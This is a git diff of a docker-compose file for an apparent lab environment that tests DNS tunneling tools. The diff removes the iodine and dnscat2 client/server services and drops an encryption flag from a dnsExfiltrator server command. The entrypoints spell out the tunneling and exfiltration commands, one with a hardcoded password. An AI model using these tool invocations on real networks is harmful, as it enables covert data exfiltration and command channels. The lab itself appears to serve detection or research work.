@@ -93,61 +93,7 @@ services:
     restart: unless-stopped
     profiles:
       - essential
-
-  iodine-server:
-    container_name: iodine-server
-    build: ./iodine-server
-    profiles: ["iodine"]
-    privileged: true
-    cap_add:
-      - NET_ADMIN
-    networks:
-      server-network:
-        ipv4_address: 192.168.3.3
-    restart: no
-    entrypoint: ["iodined", "-P", "password", "-f", "10.0.0.1", "tunnel.com"]
-
-  iodine-client:
-    container_name: iodine-client
-    build: ./iodine-client
-    profiles: ["iodine"]
-    privileged: true
-    cap_add:
-      - NET_ADMIN
-    dns:
-      - 172.16.0.2
-    networks:
-      client-network:
-        ipv4_address: 172.16.0.10
-    restart: no
-    entrypoint: ["iodine", "-f", "-L0", "-r", "-T", "A", "-O", "Base32", "-I", "5", "-M", "100", "-m", "20", "-L", "1", "-P", "password", "172.16.0.2", "tunnel.com"]
-
-  dnscat2-client:
-    container_name: dnscat2-client
-    profiles: ["dnscat2"]
-    build: ./dnscat2-client
-    volumes:
-      - ./dnscat2-client/dnscat2:/dnscat2/
-    entrypoint: ["./dnscat", "--dns", "domain=dnscat2-tunnel.com,type=AAAA", "--no-encryption"]
-    networks:
-      client-network:
-        ipv4_address: 172.16.30.30
-    dns:
-      - 172.16.0.2
-
-  dnscat2-server:
-    container_name: dnscat2-server
-    profiles: ["dnscat2"]
-    build: ./dnscat2-server
-    tty: true       
-    stdin_open: true
-    volumes:
-      - ./dnscat2-server/dnscat2:/dnscat2/
-    entrypoint: ["ruby", "./dnscat2.rb", "dnscat2-tunnel.com", "--security=open"]
-    networks:
-      server-network:
-        ipv4_address: 192.168.3.3
-    
+        
   dnsexfiltrator-client:
     container_name: dnsexfiltrator-client
     profiles: ["dnsexfiltrator"]
@@ -167,7 +113,7 @@ services:
     build: ./dnsexfiltrator-server
     volumes:
       - ./dnsexfiltrator-server/volume/:/app/
-    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test", "-s", "ENC"]
+    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test"]
     networks:
       server-network:
         ipv4_address: 192.168.4.4
